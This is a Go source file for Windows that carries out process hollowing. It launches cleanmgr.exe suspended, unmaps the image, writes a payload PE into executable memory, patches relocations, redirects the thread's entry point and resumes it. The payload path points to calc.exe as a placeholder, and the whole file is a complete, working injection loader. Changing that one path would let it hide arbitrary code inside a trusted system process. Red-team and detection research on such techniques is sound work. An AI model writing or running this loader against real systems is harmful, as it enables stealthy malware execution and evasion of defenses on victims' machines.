package main

import (
	"fmt"
	"log"
	"unsafe"

	"golang.org/x/sys/windows"
)

func main() {

	var (
		// Misc variables
		targetProcess           = "C:\\Windows\\system32\\cleanmgr.exe" // The process we want to hollow out
		targetProcessUTF16, _   = windows.UTF16FromString(targetProcess)
		injectedProcess         = "C:\\Windows\\system32\\calc.exe" // Our PE payload
		injectedProcessUTF16, _ = windows.UTF16FromString(injectedProcess)

		// DLL functions that are not defined in the windows package
		// ReadFile is defined, but forces me to use a byte array. I wanna use the pointer to the space allocated on the heap instead.
		ntdll                     = windows.NewLazyDLL("Ntdll.dll")
		ntQueryInformationProcess = ntdll.NewProc("NtQueryInformationProcess")
		ntUnmapViewOfSection      = ntdll.NewProc("NtUnmapViewOfSection")
		kernel32DLL               = windows.NewLazyDLL("Kernel32.dll")
		readProcessMemory         = kernel32DLL.NewProc("ReadProcessMemory")
		getFileSize               = kernel32DLL.NewProc("GetFileSize")
		getProcessHeap            = kernel32DLL.NewProc("GetProcessHeap")
		heapAlloc                 = kernel32DLL.NewProc("HeapAlloc")
		readFile                  = kernel32DLL.NewProc("ReadFile")
		virtualAllocEx            = kernel32DLL.NewProc("VirtualAllocEx")
		writeProcessMemory        = kernel32DLL.NewProc("WriteProcessMemory")
		getThreadContext          = kernel32DLL.NewProc("GetThreadContext")
		setThreadContext          = kernel32DLL.NewProc("SetThreadContext")
	)

	// Start the target process in a suspended state
	var startupInfo windows.StartupInfo
	var processInfo windows.ProcessInformation
	fmt.Println("[+] Starting victim process")
	err := windows.CreateProcess(nil, &targetProcessUTF16[0], nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, &startupInfo, &processInfo)
	defer windows.CloseHandle(processInfo.Process)
	if err != nil {
		fmt.Println("[-] Failed to start victim process")
	}

	fmt.Printf("[+] Started process PID %d\n", processInfo.ProcessId)

	// Try to find victim process' PROCESS_BASIC_INFORMATION
	var procBasicInfo PROCESS_BASIC_INFORMATION // Cannot use processInfo here, since the windows package does not support this. A buffer this size should do.
	var returnedLength uint32
	r1, _, _ := ntQueryInformationProcess.Call(
		uintptr(processInfo.Process),
		uintptr((uint32)(0)), // ProcessBasicInformation
		uintptr(unsafe.Pointer((*byte)(unsafe.Pointer(&procBasicInfo)))), // Inspired by https://github.com/winlabs/gowin32/blob/master/process.go
		uintptr((uint32)(unsafe.Sizeof(procBasicInfo))),
		uintptr(unsafe.Pointer(&returnedLength)),
	)
	if r1 != 0 {
		log.Fatal("[-] Failed to retrieve victim's PROCESS_BASIC_INFORMATION")
	}
	fmt.Printf("[+] Retrieved PROCESS_BASIC_INFORMATION, returned %d bytes\n", returnedLength)

	// Trying to retrieve PEB
	var peb PEB
	var bytesRead uint32
	r1, _, _ = readProcessMemory.Call(
		uintptr(processInfo.Process),
		procBasicInfo.PebBaseAddress,
		uintptr(unsafe.Pointer((*byte)(unsafe.Pointer(&peb)))),
		uintptr((uint32)(unsafe.Sizeof(peb))),
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if r1 == 0 {
		log.Fatal("[-] Failed to retrieve victim's PEB")
	}
	fmt.Printf("[+] Retrieved PEB and BaseImageAddress, read %d bytes\n", bytesRead)
	fmt.Printf("[+] Retrieved ImageBaseAddress at %p\n", unsafe.Pointer(peb.ImageBaseAddress))

	// Trying to write the payload executable to memory
	file, err := windows.CreateFile(&injectedProcessUTF16[0], windows.GENERIC_READ, 0, nil, windows.OPEN_ALWAYS, 0, 0)
	defer windows.CloseHandle(file)
	if err != nil {
		fmt.Println("[-] Failed to open file")
		log.Fatal(err)
	}
	fileSizeUintptr, _, _ := getFileSize.Call(uintptr(file), uintptr(unsafe.Pointer(nil)))
	fileSize := (uint32)(fileSizeUintptr)
	fmt.Printf("[+] Read file %s, total of %d bytes\n", injectedProcess, fileSize)
	heap, _, _ := getProcessHeap.Call()
	heapHandle := (windows.Handle)(heap)
	defer windows.CloseHandle(heapHandle)
	if heap == 0 {
		log.Fatal("[-] Failed to get process heap")
	}
	// dwFlags = 0x00000008 should be HEAP_ZERO_MEMORY
	heapStartPtr, _, _ := heapAlloc.Call(heap, uintptr((uint32)(8)), uintptr((uint32)(fileSize)))
	if heapStartPtr == 0 {
		log.Fatal("[-] Failed allocate space on the heap")
	}
	bytesRead = 0
	r1, _, _ = readFile.Call(
		uintptr(file),
		heapStartPtr, // This I could have not done with the funtion defined in the windows package
		uintptr((uint32)(fileSize)),
		uintptr((uint32)(bytesRead)),
		uintptr(unsafe.Pointer(nil)),
	)
	// Would expected to check that readBytes matches fileSize here, but apparently readBytes returns 0 if reading to
	// EOF (which we are doing) as descibed here https://devblogs.microsoft.com/oldnewthing/20150121-00/?p=44863
	if r1 == 0 {
		log.Fatal("[-] Failed to write payload to the heap")
	}
	fmt.Println("[+] Successfully written payload to heap")

	// Trying to get the SizeOfImage of our payload executable from the file we just copied into memory
	dosHeaders := (*IMAGE_DOS_HEADERS)(unsafe.Pointer(heapStartPtr))
	ntHeadersStartPrt := heapStartPtr + uintptr(dosHeaders.E_lfanew)
	ntHeaders := (*IMAGE_NT_HEADERS)(unsafe.Pointer(ntHeadersStartPrt))
	fmt.Println("[+] Retrieved payload's SizeOfImage")

	// Trying to hollow target process
	r1, _, _ = ntUnmapViewOfSection.Call(
		uintptr(processInfo.Process),
		peb.ImageBaseAddress,
	)
	if r1 != 0 {
		log.Fatal("[-] Failed to unmap target process image memory location")
	}
	fmt.Println("[+] Successfully unmapped target process memory")

	// Trying to allocate enough memory on victim process to fit our payload in
	r1, _, _ = virtualAllocEx.Call(
		uintptr(processInfo.Process),
		uintptr(peb.ImageBaseAddress),
		uintptr(ntHeaders.OptionalHeader.SizeOfImage),
		uintptr(windows.MEM_RESERVE|windows.MEM_COMMIT),
		uintptr(windows.PAGE_EXECUTE_READWRITE),
	)
	if r1 == 0 {
		log.Fatal("[-] Failed to allocate memory on the victim process")
	}

	fmt.Println("[+] Successfully allocated memory on victim process")

	// Trying to write payload to target process
	// Starting with the headers
	var bytesWritten uint32
	// Get image base delta for later relocation
	deltaImageBase := peb.ImageBaseAddress - uintptr(ntHeaders.OptionalHeader.ImageBase)
	ntHeaders.OptionalHeader.ImageBase = uint64(peb.ImageBaseAddress)
	r1, _, _ = writeProcessMemory.Call(
		uintptr(processInfo.Process),
		peb.ImageBaseAddress,
		heapStartPtr,
		uintptr(ntHeaders.OptionalHeader.SizeOfHeaders),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if r1 == 0 || bytesWritten != ntHeaders.OptionalHeader.SizeOfHeaders {
		log.Fatal("[-] Failed to copy headers to remote process")
	}
	fmt.Println("[+] Copied headers to target process")

	// Now we copy the PE sections, this part took me a while to get
	// First of all, we need to find the pointer to the first section header which should be right after the Optional Headers
	sectionHeaderPtr := uintptr(unsafe.Pointer(heapStartPtr + uintptr(dosHeaders.E_lfanew) + unsafe.Sizeof(*ntHeaders)))
	relocName := [8]byte{46, 114, 101, 108, 111, 99, 0, 0}
	var relocationSection *IMAGE_SECTION_HEADER
	var i uint16
	for i = 0; i < ntHeaders.FileHeader.NumberOfSections; i++ {
		sectionHeader := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(sectionHeaderPtr))
		// Check if we hit the .reloc section yet
		if sectionHeader.Name == relocName {
			relocationSection = sectionHeader
		}
		// We now need to get memory destination of the target process where the section should be copied to
		destSectionLocation := peb.ImageBaseAddress + uintptr(sectionHeader.VirtualAddress)
		// Now we need to get the location of the section in the file, aka in the current process heap
		srcSectionLocation := heapStartPtr + uintptr(sectionHeader.PointerToRawData)
		// Actually write to remote memory and advance section header pointer
		bytesWritten = 0
		r1, _, _ = writeProcessMemory.Call(
			uintptr(processInfo.Process),
			destSectionLocation,
			srcSectionLocation,
			uintptr(sectionHeader.SizeOfRawData),
			uintptr(unsafe.Pointer(&bytesWritten)),
		)
		if r1 == 0 || bytesWritten != sectionHeader.SizeOfRawData {
			log.Fatal("[-] Failed to copy a section to remote memory")
		}
		sectionHeaderPtr += unsafe.Sizeof(*sectionHeader)
	}
	fmt.Println("[+] Succefully copied PE section to target process")

	// Now we have to fix the relocations.
	// Basically, we need to go through the relocation table and add the delta between
	// where the image was loaded in the original ImageBase and the new one.
	// If we don't, all the addresses Windows will go and patch will be off by the delta

	var relocationTableDataDir IMAGE_DATA_DIRECTORY
	relocationTableDataDir.VirtualAddress = ntHeaders.OptionalHeader.RelocationDirectoryRVA
	relocationTableDataDir.Size = ntHeaders.OptionalHeader.RelocationDirectorySize

	var relocationOffset uint32 = 0
	var relocationTable = relocationSection.PointerToRawData

	for relocationOffset < relocationTableDataDir.Size {
		relocationBlockPtr := heapStartPtr + uintptr(relocationTable) + uintptr(relocationOffset)
		relocationBlock := (*BASE_RELOCATION_BLOCK)(unsafe.Pointer(relocationBlockPtr))
		relocationOffset += uint32(unsafe.Sizeof(*relocationBlock))
		numberRelocationEntries := (relocationBlock.BlockSize - uint32(8)) / uint32(2)
		for i := 0; i < int(numberRelocationEntries); i++ {
			relocationEntryPtr := heapStartPtr + uintptr(relocationTable) + uintptr(relocationOffset)
			relocationEntry := GetBaseRelocationEntry(*(*uint16)(unsafe.Pointer(relocationEntryPtr)))
			if relocationEntry.Type != 0 {
				var bytesRead uint32 = 0
				var bytesWritten uint32 = 0
				patchAddress := uintptr(relocationBlock.PageRVA) + uintptr(relocationEntry.Offset)
				patchedBuffer := uint64(0)
				r1, _, _ := readProcessMemory.Call(
					uintptr(processInfo.Process),
					peb.ImageBaseAddress+patchAddress,
					uintptr(unsafe.Pointer(&patchedBuffer)),
					uintptr(8), // sizeof uint64
					uintptr(unsafe.Pointer(&bytesRead)),
				)
				if r1 == 0 || bytesRead != 8 {
					log.Fatal("[-] Failed to retrieve relocation entry")
				}
				patchedBuffer += uint64(deltaImageBase)
				r1, _, _ = writeProcessMemory.Call(
					uintptr(processInfo.Process),
					peb.ImageBaseAddress+patchAddress,
					uintptr(unsafe.Pointer(&patchedBuffer)),
					uintptr(8),
					uintptr(unsafe.Pointer(&bytesWritten)),
				)
				if r1 == 0 || bytesWritten != 8 {
					log.Fatal("[-] Failed to write relocation entry to memory")
				}
			}
			relocationOffset += 2
		}

	}

	// Restarting the process
	// We need to restart the suspended thread. Since the entrypoints of the two PEs are different
	// we need to patch the old entrypoint, stored in the Rcx register, with the one.
	// This can be done by modifying the thread context.

	var context CONTEXT
	context.ContextFlags = (0x00100000 | 0x00000002) // CONTEXT_INTEGER
	r1, _, _ = getThreadContext.Call(
		uintptr(processInfo.Thread),
		uintptr(unsafe.Pointer(&context)),
	)
	if r1 == 0 {
		log.Fatal("[-] Failed to retrieve target process thread context")
	}
	fmt.Println("[+] Retrieved thread context")

	newEntryPoint := peb.ImageBaseAddress + uintptr(ntHeaders.OptionalHeader.AddressOfEntryPoint)
	context.Rcx = uint64(newEntryPoint)
	r1, _, _ = setThreadContext.Call(
		uintptr(processInfo.Thread),
		uintptr(unsafe.Pointer(&context)),
	)
	if r1 == 0 {
		log.Fatal("[-] Failed to set remote process thread context")
	}

	res, err := windows.ResumeThread(processInfo.Thread)
	if res != 1 || err != nil {
		log.Fatal("[-] Failed to resume remote process thread")
	}
	fmt.Println("[+] Successfully resumed remote thread")
}
